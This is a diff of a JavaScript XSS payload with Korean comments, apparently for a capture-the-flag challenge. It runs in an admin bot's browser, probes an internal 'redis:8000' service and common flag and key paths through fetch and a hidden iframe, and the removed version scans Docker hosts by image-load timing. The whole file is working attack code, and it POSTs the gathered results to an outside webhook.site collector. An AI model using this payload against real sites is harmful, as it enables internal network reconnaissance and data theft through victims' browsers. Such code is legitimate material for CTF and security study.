@@ -1,87 +1,76 @@
 (async () => {
     const WEBHOOK = 'https://webhook.site/144fdef3-ea07-4316-bff4-7619115f30f3';
+    const TARGET = 'http://redis:8000';
 
-    // 1. 도커 네트워크 스캔 (호스트네임 추측)
-    // CTF에서 자주 쓰이는 컨테이너 이름들입니다.
-    const hosts = ['flag', 'admin', 'db', 'redis', 'internal', 'web', 'bot', 'challenge'];
-    const ports = [80, 8000, 8080, 5000];
-    
-    let networkResults = {};
-
-    // 2. 파일 경로 스캔 (Port 5000)
-    // 혹시 정적 파일이나 루트에 플래그 파일이 있는지 확인
-    const paths = ['/flag', '/flag.txt', '/app/flag', '/static/flag.txt', '/robots.txt', '/sitemap.xml'];
-    let pathResults = {};
-
-    // [함수 A] 호스트 스캔 (Image Blind Scan 사용)
-    // fetch는 CORS 때문에 실패할 수 있으니, 이미지를 사용하여 '연결 가능 여부'를 봅니다.
-    const checkHost = (host, port) => {
-        return new Promise(resolve => {
-            const img = new Image();
-            const start = Date.now();
-            let resolved = false;
-
-            // 1.5초 이상 걸리면 '열려있음(타임아웃)' 또는 '느린 응답'으로 간주
-            const timeout = setTimeout(() => {
-                if(!resolved) { resolved = true; resolve({host, port, status: 'TIMEOUT (Maybe Open)'}); }
-            }, 1500);
-
-            // DNS가 해석되고 연결이 되면(404라도) onerror가 뜹니다.
-            // 호스트가 없으면(NXDOMAIN) 브라우저가 즉시 에러를 냅니다(chrome: very fast).
-            // 따라서 "시간"이 중요합니다.
-            img.onerror = () => {
-                if(!resolved) { 
-                    resolved = true; clearTimeout(timeout);
-                    const time = Date.now() - start;
-                    // 호스트 찾음: 보통 DNS lookup + connection이라 아주 빠르진 않음 (>10ms)
-                    // 호스트 없음: 즉시 실패 (<5ms)
-                    resolve({host, port, status: 'ERROR', time}); 
-                }
-            };
-            
-            img.onload = () => { /* 거의 안 일어남 */ };
-            img.src = `http://${host}:${port}/favicon.ico?r=${Math.random()}`;
-        });
+    const report = {
+        msg: "Targeting Internal Service (redis:8000)",
+        fetchTest: "Pending",
+        iframeTest: "Pending",
+        paths: {},
+        location: window.location.href
     };
 
-    // [함수 B] 파일 경로 스캔 (Fetch 사용)
-    // 같은 출처(Port 5000)이므로 fetch로 내용 읽기 가능
-    for (const path of paths) {
-        try {
-            const res = await fetch(path);
-            if (res.status === 200) {
-                pathResults[path] = await res.text();
-            } else {
-                pathResults[path] = `Status ${res.status}`;
-            }
-        } catch(e) {}
+    // 1. [Fetch 시도] CORS 헤더가 혹시 설정되어 있는지 확인
+    // 내부 서비스는 개발 편의상 'Access-Control-Allow-Origin: *'를 켜두는 경우가 많습니다.
+    try {
+        const res = await fetch(TARGET + '/');
+        report.fetchTest = `Success (Status: ${res.status})`;
+        report.fetchBody = await res.text(); // 대박! 내용을 읽음
+    } catch (e) {
+        report.fetchTest = `Blocked/Failed: ${e.toString()}`;
     }
 
-    // 네트워크 스캔 실행
-    for (const host of hosts) {
-        for (const port of ports) {
-            const res = await checkHost(host, port);
-            // 20ms 이상 걸린 것만 기록 (너무 빠른 건 호스트 없음일 가능성 큼)
-            if (res.status.includes('TIMEOUT') || (res.status === 'ERROR' && res.time > 20)) {
-                networkResults[`http://${host}:${port}`] = `${res.status} (${res.time}ms)`;
-                
-                // 만약 호스트가 살아있다면, 내용 훔치기 시도 (CORS 무시 fetch)
-                try {
-                    fetch(`http://${host}:${port}/flag`, {mode: 'no-cors'}); 
-                    // 이건 성공 여부를 알 수 없지만, 서버 로그에 남기기 위함
-                } catch(e) {}
-            }
+    // 2. [경로 추측] 내부 서비스에 있을법한 경로 찔러보기 (Fetch)
+    // CORS가 막혀있어도, mode: 'no-cors'로 요청을 보내면
+    // 서버 사이드에서 어떤 동작(로그 기록 등)을 할 수도 있고, 
+    // 운 좋게 특정 경로는 CORS가 풀려있을 수도 있습니다.
+    const paths = ['/flag', '/admin', '/status', '/keys', '/robots.txt'];
+    for (const path of paths) {
+        try {
+            const res = await fetch(TARGET + path);
+            report.paths[path] = `OPEN: ${await res.text()}`;
+        } catch(e) {
+            // CORS 에러면 읽을 수 없음
+            report.paths[path] = "CORS Blocked or 404"; 
         }
     }
 
-    fetch(WEBHOOK, {
+    // 3. [Iframe 시도] 브라우저 화면 내에 강제로 띄우기
+    // X-Frame-Options가 없다면 로딩됩니다.
+    // 우리는 내용을 못 읽어도, onload/onerror로 로딩 성공 여부는 알 수 있습니다.
+    // (공격자가 시각적으로 확인할 순 없지만, 로깅용)
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = TARGET + '/';
+    
+    await new Promise(resolve => {
+        iframe.onload = () => {
+            report.iframeTest = "Loaded (X-Frame-Options allowed)";
+            // 같은 출처가 아니라서 iframe.contentDocument 접근은 불가능 (SOP)
+            resolve();
+        };
+        iframe.onerror = () => {
+            report.iframeTest = "Error Loading";
+            resolve();
+        };
+        document.body.appendChild(iframe);
+        setTimeout(resolve, 2000); // 2초 타임아웃
+    });
+
+    // 4. [최후의 수단] 봇을 해당 주소로 납치 (Redirect)
+    // 만약 위의 모든 방법으로도 플래그를 '읽어올' 수 없다면,
+    // 봇을 강제로 http://redis:8000/flag 로 이동시켜버립니다.
+    // (주의: 이 코드가 실행되면 봇이 페이지를 떠나므로 위 fetch들이 먼저 끝나야 함)
+    
+    // 데이터 먼저 전송
+    await fetch(WEBHOOK, {
         method: 'POST',
         mode: 'no-cors',
-        body: JSON.stringify({
-            msg: "Docker Network & File Scan",
-            network: networkResults,
-            files: pathResults,
-            location: window.location.href
-        })
+        body: JSON.stringify(report)
     });
+
+    // 0.5초 뒤 봇을 내부망으로 던져버림 (혹시 화면에 플래그가 뜬다면...)
+    // 이 부분은 이번 단계에서 데이터를 못 얻었을 때 사용하는 '논개 작전'입니다.
+    // 지금은 주석 처리하거나 마지막 보루로 남겨둡니다.
+    // setTimeout(() => { window.location = TARGET + '/flag'; }, 1000); 
 })();
